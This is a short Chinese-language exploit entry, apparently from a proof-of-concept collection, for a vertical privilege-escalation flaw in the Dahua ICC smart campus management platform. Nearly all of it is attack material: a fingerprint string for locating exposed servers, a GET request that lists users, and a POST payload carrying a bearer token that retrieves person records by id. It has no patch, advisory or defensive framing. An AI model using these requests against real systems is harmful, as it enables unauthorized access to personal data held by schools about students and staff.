# 大华ICC智慧校园综合管理平台垂直越权漏洞

大华 ｜ 未授权访问 ｜ —
- **指纹**：`body="/static/fontshd/font-hd.css"`
- **请求**：`GET /evo-apigw/evo-brm/1.2.0/user/page?pageNum=2&pageSize=10&searchKey=&sortType=&isReuse=&isOnline=&userId=1&userType=&ownerCode=001&stats=&isContain=true&needSystemReserve=0 HTTP/1.1`

**Payload**
```
POST /evo-apigw/evo-erm/1.0.0/web/person/detail HTTP/1.1
Host:xxxxxxxxxxxxx
Content-Type: application/json;charset=utf-8
Authorization: bearer 12:uYapooS1lJosRYHa388H2lkAzByXT0Zt
Content-Length: 13
{“id”:1}
```